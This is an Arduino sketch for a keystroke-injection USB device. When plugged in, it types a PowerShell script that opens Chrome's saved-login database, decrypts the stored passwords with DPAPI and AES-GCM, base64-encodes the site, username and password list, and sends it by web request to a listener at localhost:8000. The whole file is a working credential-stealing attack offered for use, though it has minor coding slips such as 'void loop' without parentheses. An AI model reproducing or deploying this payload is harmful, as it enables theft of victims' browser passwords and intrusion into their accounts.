#include <HID-Project.h>
#include <HID-Settings.h>

void setup() {
  keyboard.begin();
  delay(2000);
}

void loop {
  keyboard.pressKey(GUI, 'r');  // open up powershell
  keyboard.releaseKey();
  delay(500);
  keyboard.println("powershell");
  delay(1500);

  keyboard.println("$d=Add-Type -A System.Security");

  keyboard.println("$p='public static'");

  keyboard.println("$g=\"\"\")]$p extern\"");

  keyboard.println("$i='[DllImport(\"winsqlite3\",EntryPoint=\"sqlite3_'");

  keyboard.println("$m=\"[MarshalAs(UnmanagedType.LP\"");

  keyboard.println("$q='(s,i)'");

  keyboard.println("$f='(p s,int i)'");

  keyboard.println("$z=$env:LOCALAPPDATA+'\\Google\\Chrome\\User Data'");

  keyboard.println("$u=[Security.Cryptography.ProtectedData]");

  keyboard.println("Add-Type \"using System.Runtime.InteropServices;using p=System.IntPtr;$p class W{$($i)open$g p O($($m)Str)]string f,out p d);$($i)prepare16_v2$g p P(p d,$($m)WStr)]string l,int n,out p s,p t);$($i)step$g p S(p s);$($i)column_text16$g p C$f;$($i)column_bytes$g int Y$f;$($i)column_blob$g p L$f;$p string T$f{return Marshal.PtrToStringUni(C$q);}$p byte[] B$f{var r=new byte[Y$q];Marshal.Copy(L$q,r,0,Y$q);return r;}}\"");

  keyboard.println("$s=[W]::O(\"$z\\\\Default\\\\Login Data\",[ref]$d)");

  keyboard.println("$l=@()");

  keyboard.println("if($host.Version-like\"7*\"){$b=(gc \"$z\\\\Local State\"|ConvertFrom-Json).os_crypt.encrypted_key");

  keyboard.println("$x=[Security.Cryptography.AesGcm]::New($u::Unprotect([Convert]::FromBase64String($b)[5..($b.length-1)],$n,0))}$_=[W]::P($d,\"SELECT*FROM logins WHERE blacklisted_by_user=0\",-1,[ref]$s,0)");

  keyboard.println("for(;!([W]::S($s)%100)){$l+=[W]::T($s,0),[W]::T($s,3)");

  keyboard.println("$c=[W]::B($s,5)");

  keyboard.println("try{$e=$u::Unprotect($c,$n,0)}catch{if($x){$k=$c.length");

  keyboard.println("$e=[byte[]]::new($k-31)");

  keyboard.println("$x.Decrypt($c[3..14],$c[15..($k-17)],$c[($k-16)..($k-1)],$e)}}$l+=($e|%{[char]$_})-join''}");

  keyboard.println("$r=[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(($l)-join','))");

  keyboard.println("Invoke-WebRequest http://localhost:8000/?$r");

  delay(4000);

  keyboard.println("exit");

  while(1);
}
